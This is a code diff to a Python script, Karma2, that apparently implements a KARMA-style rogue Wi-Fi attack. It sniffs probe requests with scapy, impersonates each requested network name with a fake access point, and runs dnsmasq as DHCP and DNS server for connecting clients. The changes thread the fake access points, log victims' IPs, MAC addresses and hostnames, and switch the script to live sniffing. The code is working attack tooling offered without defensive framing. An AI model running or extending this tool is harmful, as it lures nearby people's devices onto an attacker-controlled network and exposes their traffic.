@@ -1,32 +1,45 @@
 #!/usr/bin/env python
 
-from threading import Lock
+from threading import Lock,Thread
 import time,random,re,tempfile
 import subprocess
 from scapy.all import *
 
 class Karma2:
 
-  class AccessPoint:
+  class AccessPoint(Thread):
     def __init__(self, karma, essid):
+      Thread.__init__(self)
       self.essid = essid
       self.karma = karma
 
       iface,airbase_process = self.create_access_point(essid)
       subnet = self.karma.get_unique_subnet()
       self.setup_iface(iface,subnet)
-      dhcpd_process = self.start_dhcpd(iface,subnet)
+      self.dhcpd_process = self.start_dhcpd(iface,subnet)
+
+    def run(self):
+      while True:
+        line = self.dhcpd_process.stderr.readline()
+        if len(line) == 0:
+          time.sleep(0.1)
+          continue
+        m = re.match(
+          r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
+        if m is not None:
+          ip,mac,name = m.groups()
+          print "DHCPACK from %s (%s)"%(ip,name)
 
     def start_dhcpd(self, iface, subnet):
       # create a temporary file
       print "[+] Starting dhcp server %s %s"%(iface,subnet)
       cmd = ['dnsmasq',
         '-d',
+        '--bind-dynamic',
         '-i', iface,
         '-F', '192.168.%d.100,192.168.%d.200'%(subnet,subnet),
         '--dhcp-option=option:router,192.168.%d.254'%(subnet),
         '--dhcp-option=option:dns-server,192.168.%d.254'%(subnet),
-        '-z',
         '-R','-S','8.8.8.8',
       ]
       p = subprocess.Popen(cmd,
@@ -95,7 +108,11 @@ class Karma2:
         # SSID
         if section.ID == 0 and section.info != '':
           if not section.info in self.aps.keys():
-            self.aps[section.info] = self.AccessPoint(self, section.info)
+
+            ap = self.AccessPoint(self, section.info)
+            ap.daemon = True
+            ap.start()
+            self.aps[section.info] = ap
 
     sniff(prn=_filter)
 
@@ -108,9 +125,11 @@ if __name__ == '__main__':
   MONITOR_INTERFACE='wlan1mon'
   km = Karma2(GATEWAY_INTERFACE, MONITOR_INTERFACE)
 
-  #km.do_sniff()
-  for i in xrange(0,10):
-    Karma2.AccessPoint(km,"NSA honeypot #%d"%i)
+  km.do_sniff()
+  #for i in xrange(0,3):
+  #  ap = Karma2.AccessPoint(km,"NSA honeypot #%d"%i)
+  #  ap.daemon = True
+  #  ap.start()
 
   while True:
     time.sleep(1)
